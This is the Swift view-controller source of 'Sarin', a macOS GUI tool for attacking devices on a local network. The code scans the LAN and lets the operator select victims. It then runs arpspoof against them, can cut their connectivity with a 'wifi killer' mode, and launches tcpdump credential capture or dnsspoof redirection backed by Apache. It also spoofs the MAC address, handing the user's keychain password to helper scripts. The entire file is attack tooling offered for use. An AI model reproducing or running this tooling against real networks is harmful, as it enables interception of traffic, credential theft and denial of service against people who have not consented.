//
//  ViewController.swift
//  Sarin
//
//  Created by Josh Zhe on 5/12/19.
//  Copyright © 2019 w4ftDev. All rights reserved.
//

import Cocoa
import KeychainAccess


class ViewController: NSViewController {
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        NotificationCenter.default.addObserver(self, selector: #selector(viewDidAppear), name: NSNotification.Name(rawValue: "load"), object: nil)
        
        dnsConfigureButton.isEnabled = false
        
        macLabel.isHidden = true
        isChecked = UserDefaults.standard.bool(forKey: "isApacheChecked")
        if isChecked{
            apacheButton.state = .on
        }else{
            apacheButton.state = .off
        }
        isArp = false
        outputText.usesFindBar = true
        startARPButton.isEnabled = false
        stopARPButton.isEnabled = false
        outputText.string = getTodayString() + " Sarin Console: \n"
        tableView.delegate = self
        tableView.dataSource = self
        //        hasBeenSetup = false
        //Show Setup Page on Start if hasBeenSetup == false
        if !hasBeenSetup{
            _ = Timer.scheduledTimer(timeInterval: 1.0, target: self, selector: #selector(presentSheet), userInfo: nil, repeats: false)
        }
    }
    
    override func viewDidAppear() {
        if helpIsEnabled{
            arpHelpButton.isHidden = false
            macHelpButton.isHidden = false
            miscHelpButton.isHidden = false
        }else{
            arpHelpButton.isHidden = true
            macHelpButton.isHidden = true
            miscHelpButton.isHidden = true
        }
    }
    
    
    //MARK: Outlets
    @IBOutlet weak var dnsConfigureButton: NSButton!
    @IBOutlet weak var scanLanButton: NSButton!
    @IBOutlet weak var tableView: NSTableView!
    @IBOutlet weak var arpProgressSpinner: NSProgressIndicator!
    @IBOutlet weak var startARPButton: NSButton!
    @IBOutlet weak var stopARPButton: NSButton!
    @IBOutlet var outputText: NSTextView!
    @IBOutlet weak var attackSpinner: NSProgressIndicator!
    @IBOutlet weak var startAttackButton: NSButton!
    @IBOutlet weak var stopAttackButton: NSButton!
    @IBOutlet weak var wifiKillerModeSwitch: NSButton!
    @IBOutlet weak var configureAttackbutton: NSButton!
    @IBOutlet weak var apacheButton: NSButton!
    @IBOutlet weak var macTextField: NSTextField!
    
    @IBOutlet weak var macLabel: NSTextField!
    
    @IBOutlet weak var macHelpButton: NSButton!
    @IBOutlet weak var arpHelpButton: NSButton!
    @IBOutlet weak var miscHelpButton: NSButton!
    
    //MARK: Variables
    var hasBeenSetup:Bool = defaults.bool(forKey: "isInstalled")
    var data:[String] = []
    var isChecked: Bool = false
    var tcpdump:String = ""
    var attack:String = "tcpdump"
    var scanDict = ["ip1": "mac1","ip2": "mac2","ip3": "mac3"]
    var ipList:[String] = []
    var macList:[String] = []
    var infoList:[String] = []
    var unparsedScan:String = ""
    var rowIndexes:[Int] = []
    var routerIP:String = ""
    var currentDevices:[String] = []
    var isArp:Bool=false
    
    //MARK: Parse Output Function
    func parseOutput(input: String){
        let characters = Array(input)
        
        var createdString: String = ""
        var listOfDeviceInfo: [String] = []
        
        //        print(characters)
        for (_,character) in characters.enumerated(){
            if (character != "\t" && character != "\n"){
                createdString.append(character)
            }
            if (character == "\t" || character == "\n"){
                //                print(createdString)
                listOfDeviceInfo.append(createdString)
                createdString = ""
            }
        }
        //        print(listOfDeviceInfo)
        //        print("listOfDevice Count: " + listOfDeviceInfo.count)
        
        for (index, string) in listOfDeviceInfo.enumerated(){
            if (index%3 == 0){
                ipList.append(string)
            }
            if (index%3 == 1){
                macList.append(string)
            }
            if (index%3 == 2){
                infoList.append(string)
            }
        }
    }
    
    func getTodayString() -> String{
        
        let date = Date()
        let calender = Calendar.current
        let components = calender.dateComponents([.year,.month,.day,.hour,.minute,.second], from: date)
        
        let year = components.year
        let month = components.month
        let day = components.day
        let hour = components.hour
        let minute = components.minute
        let second = components.second
        
        let today_string = String(year!) + "-" + String(month!) + "-" + String(day!) + " " + String(hour!)  + ":" + String(minute!) + ":" +  String(second!)
        
        return today_string
        
    }
    
    @IBAction func generateMAC(_ sender: NSButton) {
        macTextField.stringValue = executeBashWithOutput(scriptLocation: location+"/Sarin/sarin_scripts/generateMAC.sh", param1: "")
    }
    
    
    @IBAction func setMAC(_ sender: NSButton) {
        let task = Process.init()
        task.launchPath = "/bin/bash"
        task.arguments = ["--login",location+"/Sarin/sarin_scripts/MACspoof.sh",macTextField.stringValue,keychain[NSUserName()]!]
        task.launch()
        let group = DispatchGroup()
        group.enter()
        DispatchQueue.global().async {
            task.waitUntilExit()
            group.leave()
        }
        group.notify(queue: .main) {
            self.macLabel.isHidden = false
        }
    }
    
    
    
    //MARK: Scan Lan Function
    func scanLAN(){
        let task = Process.init()
        let pipe = Pipe.init()
        task.launchPath = "/bin/bash"
        task.arguments = ["--login",location+"/Sarin/sarin_scripts/arp-scan.sh",keychain[NSUserName()]] as? [String]
        task.standardOutput = pipe
        task.launch()
        let group = DispatchGroup()
        group.enter()
        DispatchQueue.global().async {
            task.waitUntilExit()
            group.leave()
        }
        group.notify(queue: .main) {
            let data = pipe.fileHandleForReading.readDataToEndOfFile()
            let output = NSString(data: data, encoding: String.Encoding.utf8.rawValue)
            //            print(output)
            self.routerIP = getRouterIP()
            self.unparsedScan = output! as String
            self.parseOutput(input: self.unparsedScan)
            self.arpProgressSpinner.stopAnimation(self)
            self.tableView.reloadData()
        }
    }
    
    
    @IBAction func scanLanPressed(_ sender: NSButton) {
        arpProgressSpinner.startAnimation(self)
        ipList = []
        macList = []
        infoList = []
        scanLAN()
        
    }
    lazy var SetupViewController: NSViewController = {
        return self.storyboard!.instantiateController(withIdentifier: NSStoryboard.SceneIdentifier("WelcomeViewController"))
            as! NSViewController
    }()
    lazy var dnsspoofConfigureViewController: NSViewController = {
        return self.storyboard!.instantiateController(withIdentifier: NSStoryboard.SceneIdentifier("dnsspoof"))
            as! NSViewController
    }()
    
    @objc func presentSheet(){
        SetupViewController.preferredContentSize = CGSize(width: 708, height: 447)
        self.presentAsSheet(SetupViewController)
    }
    
    //Mark: Function to get a list of IPs from the selected rows
    func getIPsFromRowIndexes() -> [String]{
        var ipsFromRowIndexes: [String] = []
        
        for (_,rowIndex) in rowIndexes.enumerated(){
            ipsFromRowIndexes.append(ipList[rowIndex])
        }
        return ipsFromRowIndexes
    }
    
    func attackUsers(){
        for (_,user) in currentDevices.enumerated(){
            let task = Process.init()
            task.launchPath = "/bin/bash"
            task.arguments = (["--login",location+"/Sarin/sarin_scripts/arpspoof.sh", user,routerIP,keychain[NSUserName()]] as! [String])
        
            task.launch()
            
            let group = DispatchGroup()
            group.enter()
            
            DispatchQueue.global().async {
                task.waitUntilExit()
                group.leave()
            }
            group.notify(queue: .main) {
                
            }
        }
        
    }
    
    @IBAction func startARPButtonPressed(_ sender: NSButton) {
        for (_,ip) in getIPsFromRowIndexes().enumerated(){
            currentDevices.append(ip)
        }
        print(currentDevices)
        //        currentDevices = getIPsFromRowIndexes()
        //        print(currentDevices)
        tableView.reloadData()
        attackUsers()
        stopARPButton.isEnabled = true
        startARPButton.isEnabled = false
        wifiKillerModeSwitch.isEnabled = false
        isArp = true
    }
    
    @IBAction func stopARPButtonPressed(_ sender: Any) {
        currentDevices = []
        tableView.reloadData()
        killall(process: "arpspoof")
        startARPButton.isEnabled = true
        stopARPButton.isEnabled = false
        wifiKillerModeSwitch.isEnabled = true
        isArp = false
    }
    
    @IBAction func wifiKillModeSwitchPressed(_ sender: NSButton) {
        switch sender.state{
        case .on:
            setPackets(state: "0")
        case .off:
            setPackets(state: "1")
        default:
            setPackets(state: "1")
        }
    }
    
    @IBAction func attackButtonPressed(_ sender: Any) {
        if (attack == "tcpdump"){
            if isArp{
                attackSpinner.startAnimation(self)
                outputText.string = outputText.string + "\n########## TCPDUMP STARTED ##########\n\n"
                tcpdumpCred()
            }else{
                outputText.string = outputText.string + "\n########## NO ARPSPOOF PROCESS FOUND...TERMINATING ##########\n\n"
            }
            
        }else{
            if isArp{
                outputText.string = outputText.string + "\n########## DNSSPOOF STARTED ##########\n\n"
                if apacheButton.state == .on{
                    toggleApache(state: "start")
                }
                for (_,ip) in currentDevices.enumerated(){
                    dnsspoof(user: ip)
                }
                attackSpinner.startAnimation(self)
            }else{
                outputText.string = outputText.string + "\n########## NO ARPSPOOF PROCESS FOUND...TERMINATING ##########\n\n"
            }

        }
    }
    
    @IBAction func configureButtonPressed(_ sender: NSButton) {
        self.presentAsSheet(dnsspoofConfigureViewController)
    }
    @IBAction func stopAttackButtonPressed(_ sender: Any) {
        outputText.string = outputText.string + "\n********** STOPPED **********\n"
        if (attack == "tcpdump"){
            killall(process: "tcpdump")
            attackSpinner.stopAnimation(self)
        }else{
            killall(process: "dnsspoof")
            attackSpinner.stopAnimation(self)
        }
        if apacheButton.state == .on{
            toggleApache(state: "stop")
        }
        
    }
    
    @IBAction func apacheServerButton(_ sender: NSButton) {
        switch sender.state{
        case .on:
            isChecked = true
            UserDefaults.standard.set(isChecked, forKey: "isApacheChecked")
        case .off:
            isChecked = false
            UserDefaults.standard.set(isChecked, forKey: "isApacheChecked")
        default:
            isChecked = false
        }
    }

    
    @IBAction func chooseAttack(_ sender: NSButton) {
        
        if sender.identifier!.rawValue == "tcpdump"{
            attack = "tcpdump"
            startAttackButton.title = "Start tcpdump"
            dnsConfigureButton.isEnabled = false
            stopAttackButton.title = "Stop tcpdump"
        }
        if sender.identifier!.rawValue == "dnsspoof"{
            attack = "dnsspoof"
            dnsConfigureButton.isEnabled = true
            startAttackButton.title = "Start dnsspoof"
            stopAttackButton.title = "Stop dnspoof"
        }
    }
    
    @IBAction func clearConsolePressed(_ sender: Any) {
        outputText.string = ""
    }
    
    //Mark: Function to start tcpdump and route output to NSTextView
    func tcpdumpCred(){
        let task = Process()
        task.launchPath = "/bin/bash"
        task.arguments = ["--login",location+"/Sarin/sarin_scripts/tcpdumpCreds.sh",keychain[NSUserName()]] as? [String]
        
        let pipe = Pipe()
        task.standardOutput = pipe
        let outHandle = pipe.fileHandleForReading
        outHandle.waitForDataInBackgroundAndNotify()
        
        var obs1 : NSObjectProtocol!
        obs1 = NotificationCenter.default.addObserver(forName: NSNotification.Name.NSFileHandleDataAvailable,
        object: outHandle, queue: nil){notification -> Void in
            let data = outHandle.availableData
            if data.count > 0 {
                if let str = NSString(data: data, encoding: String.Encoding.utf8.rawValue) {
                    self.outputText.string = self.outputText.string + (str as String)}
                
                self.outputText.scrollToEndOfDocument(nil)
                outHandle.waitForDataInBackgroundAndNotify()
            } else {
                print("EOF on stdout from process")
                NotificationCenter.default.removeObserver(obs1 as Any)
            }
        }
        
        var obs2 : NSObjectProtocol!
        obs2 = NotificationCenter.default.addObserver(forName: Process.didTerminateNotification, object: task, queue: nil) { notification -> Void in
            print("terminated")
            NotificationCenter.default.removeObserver(obs2 as Any)
        }
        task.launch()
    }
    //Mark: Function to start dnsspoof and route output to NSTextView
    func dnsspoof(user:String){
        let task = Process()
        task.launchPath = "/bin/bash"
        task.arguments = ["--login",location+"/Sarin/sarin_scripts/dnspoof.sh",keychain[NSUserName()],location+"/dnsspoof.txt",user] as? [String]
        
        let pipe = Pipe()
        task.standardOutput = pipe
        let outHandle = pipe.fileHandleForReading
        outHandle.waitForDataInBackgroundAndNotify()
        
        var obs1 : NSObjectProtocol!
        obs1 = NotificationCenter.default.addObserver(forName: NSNotification.Name.NSFileHandleDataAvailable, object: outHandle, queue: nil){
            notification -> Void in
            let data = outHandle.availableData
            if data.count > 0 {
                if let str = NSString(data: data, encoding: String.Encoding.utf8.rawValue) {
                    self.outputText.string = self.outputText.string + (str as String)}
                outHandle.waitForDataInBackgroundAndNotify()
            } else {
                print("EOF on stdout from process")
                NotificationCenter.default.removeObserver(obs1 as Any)
            }
        }
        
        var obs2 : NSObjectProtocol!
        obs2 = NotificationCenter.default.addObserver(forName: Process.didTerminateNotification, object: task, queue: nil) { notification -> Void in
            print("terminated")
            NotificationCenter.default.removeObserver(obs2 as Any)
        }
        task.launch()
    }
    
    
    
}

extension ViewController:NSTableViewDataSource,NSTableViewDelegate{
    
    fileprivate enum CellIdentifiers {
        static let ipCell = "ipCellID"
        static let macCell = "macCellID"
    }
    
    
    func updateSelectionStatus(){
        let itemsSelected:Int = tableView.selectedRowIndexes.count
        
        //        print(tableView.selectedRowIndexes.map { Int($0) })
        
        startARPButton.title = "Attack Selected Devices " + "(" + String(itemsSelected) + ")"
        
        if (itemsSelected != 0){
            if routerIP != ""{
                startARPButton.isEnabled = true
            }
        }else{
            startARPButton.isEnabled = false
        }
        
        
    }
    
    func tableViewSelectionDidChange(_ notification: Notification) {
        rowIndexes = tableView.selectedRowIndexes.map { Int($0) }
        updateSelectionStatus()
    }
    
    func numberOfRows(in tableView: NSTableView) -> Int {
        return ipList.count
    }
    
    func tableView(_ tableView: NSTableView, viewFor tableColumn: NSTableColumn?, row: Int) -> NSView? {
        if tableColumn == tableView.tableColumns[0]{
            data = ipList
        }
        if tableColumn == tableView.tableColumns[1]{
            data = macList
        }
        if tableColumn == tableView.tableColumns[2]{
            data = infoList
        }
        if let cell = tableView.makeView(withIdentifier: NSUserInterfaceItemIdentifier(rawValue: "ipCellID"), owner: self) as? NSTableCellView {
            
            if currentDevices.contains(ipList[row]){
                //                print(currentDevices)
                
                cell.textField?.textColor = NSColor.red
                cell.textField?.stringValue = self.data[row]
                //                print(ipList[row])
                
                return cell
            }
            if routerIP==ipList[row]{
                //                print(currentDevices)
                
                cell.textField?.textColor = NSColor.systemBlue
                cell.textField?.stringValue = self.data[row]
                //                print(ipList[row])
                
                return cell
            }
            cell.textField?.textColor = NSColor.controlTextColor
            cell.textField?.stringValue = self.data[row]
            return cell
        }
        return nil
    }
}


